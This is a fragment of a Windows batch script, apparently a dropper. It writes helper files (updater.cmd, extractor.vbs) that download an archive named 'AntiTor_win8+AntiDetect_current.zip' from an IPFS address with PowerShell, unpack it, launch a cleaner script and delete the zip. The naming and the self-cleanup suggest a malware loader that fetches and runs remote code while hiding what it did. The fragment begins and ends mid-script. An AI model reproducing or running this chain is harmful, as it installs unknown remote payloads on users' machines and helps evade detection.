...
(
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://ipfs.io/ipns/k51qzi5uqu5dldod6robuflgitvj276br0xye3adipm3kc0bh17hfiv1e0hnp4/AntiTor_win8+AntiDetect_current.zip', '%CD%\AntiTor_win8+AntiDetect_current.zip')"
echo start "" "%userprofile%\extractor.vbs"
echo exit
) > "%userprofile%\updater.cmd"
(
cmd /u /c echo CreateObject("Shell.Application"^).NameSpace("%CD%"^).CopyHere(CreateObject("Shell.Application"^).NameSpace("%CD%\AntiTor_win8+AntiDetect_current.zip"^).items^)
cmd /u /c echo CreateObject("WScript.Shell"^).Run "%userprofile%\cleaner.cmd"
) > "%userprofile%\extractor.vbs"
(
echo del "%CD%\AntiTor_win8+AntiDetect_current.zip"
